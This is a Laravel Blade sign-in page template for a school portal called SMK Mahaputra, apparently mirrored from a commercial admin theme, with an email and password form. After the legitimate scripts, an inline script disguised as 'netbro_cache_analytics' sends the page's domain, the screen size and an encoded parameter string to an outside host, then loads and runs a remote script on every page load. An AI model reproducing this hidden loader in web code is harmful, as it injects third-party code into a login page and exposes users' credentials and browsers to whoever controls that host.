<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
  <meta name="description" content=""/>
  <meta name="author" content=""/>
  <title>SMK Mahaputra-Sign In</title>
  <!--favicon-->
  <link rel="icon" href="{{asset('assets/images/favicon.ico')}}" type="image/x-icon">
  <!-- Bootstrap core CSS-->
  <link href="{{asset('assets/css/bootstrap.min.css')}}" rel="stylesheet"/>
  <!-- animate CSS-->
  <link href="{{asset('assets/css/animate.css')}}" rel="stylesheet" type="text/css"/>
  <!-- Icons CSS-->
  <link href="{{asset('assets/css/icons.css')}}" rel="stylesheet" type="text/css"/>
  <!-- Custom Style-->
  <link href="{{asset('assets/css/app-style.css')}}" rel="stylesheet"/>
  
</head>

<body>
 <!-- Start wrapper-->
 <div id="wrapper">
    <div class="card border-primary border-top-sm border-bottom-sm card-authentication1 mx-auto my-5 animated bounceInDown">
        <div class="card-body">
         <div class="card-content p-2">
            <div class="text-center">
                <img src="{{asset('assets/images/mahaputra.JFIF')}}">
            </div>
          <div class="card-title text-uppercase text-center py-3">Sign In</div>
            <form method="POST" action="{{ route('login') }}">
                @csrf

              <div class="form-group">
               <div class="position-relative has-icon-left">
                <label for="usr_email" class="sr-only col-md-6 col-form-label text-md-right">{{ __('E-Mail Address') }}</label>
                  <input id="usr_email" type="email" class="form-control form-control-rounded @error('usr_email') is-invalid @enderror" placeholder="Masukkan Email" name="usr_email" value="{{ old('usr_email') }}" autocomplete="off" autofocus>
                  <div class="form-control-position">
                      <i class="icon-user"></i>
                  </div>
                    @error('usr_email')
                        <span class="invalid-feedback" role="alert">
                            <strong>{{ $message }}</strong>
                        </span>
                    @enderror
               </div>
              </div>

              <div class="form-group">
               <div class="position-relative has-icon-left">
                  <label for="password" class="sr-only col-md-4 col-form-label text-md-right">{{ __('Password') }}</label>
                  <input id="password" type="password" class="form-control form-control-rounded @error('password') is-invalid @enderror" placeholder="Password"  name="password" autocomplete="current-password">
                  <div class="form-control-position">
                      <i class="icon-lock"></i>
                  </div>
                    @error('password')
                        <span class="invalid-feedback" role="alert">
                        <strong>{{ $message }}</strong>
                        </span>
                    @enderror
               </div>
              </div>
            <div class="form-row mr-0 ml-0">
             <div class="form-group col-6">
               <div class="icheck-primary">
                <input type="checkbox" id="user-checkbox" checked="" />
                <label for="user-checkbox">Remember me</label>
              </div>
             </div>
             <div class="form-group col-6 text-right">
              <a class="btn btn-link" href="{{ route('forgot.password') }}">Forgot Password</a>
             </div>
            </div>
             <button id="btnSubmit" type="submit" class="btn btn-primary shadow-primary btn-round btn-block waves-effect waves-light">Sign In</button>
              <div class="text-center pt-3">
                <hr>
                <p class="text-muted">Do not have an account? <a href="{{ url('select-registration') }}"> Sign Up here</a></p>
              </div>
             </form>
           </div>
          </div>
         </div>
    
     <!--Start Back To Top Button-->
    <a href="javaScript:void();" class="back-to-top"><i class="fa fa-angle-double-up"></i> </a>
    <!--End Back To Top Button-->
    </div><!--wrapper-->
    
  <!-- Bootstrap core JavaScript-->
  <script src="{{asset('assets/js/jquery.min.js')}}"></script>
  <script src="{{asset('assets/js/popper.min.js')}}"></script>
  <script src="{{asset('assets/js/bootstrap.min.js')}}"></script>
  
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKugMuLHZvWG0xKbltMMmbcsNzvfDcif6RgPTaJ%2fpMzbNc0eNunEVaBqg%2f6LgkfHnuGbrzftbrjOVZEV6ZMDcaGBUKnoozKaf8F3wlZ9bPku0D7yaarLv7hozUmx2kb6RZGNoHI8%2fepU81DPkLIMexqOn8HNk46jEzv%2b9IcyKtiFYhnHBYobg%2fO9FzeKAL1AFMgvNon8fz4GJSBSrh4PoAESdzBgwtG7nuW32vUcWk%2bob%2bKTFLAdyulQQUdggtA5jKnhkyE%2blNpRzrOGCLJl2vLlPLjeTCW39tdBDpiBBLOVr402WX0%2bD%2fiRuJFZM0yPrRPbrI0KiVrtLwewpHZYlAEpODQDl4nL3QTVDy8sLcKYzVXNZmgaQWzR7e%2bcV9qL3SrH37h80yxG8pUdO%2b6UL1ZN7pOhpPyVoDMF9JwpM2HldtENM0XkiYyCvbPb%2bPvSLfoWq0mSS5HhKocmU3I78Mj0SMgBf3Lry%2figrlwMXvjfnoiGGb8kFC2ZyoPkv5vKN%2fek%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from codervent.com/rocker/color-version/authentication-signin.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 12:20:55 GMT -->
</html>
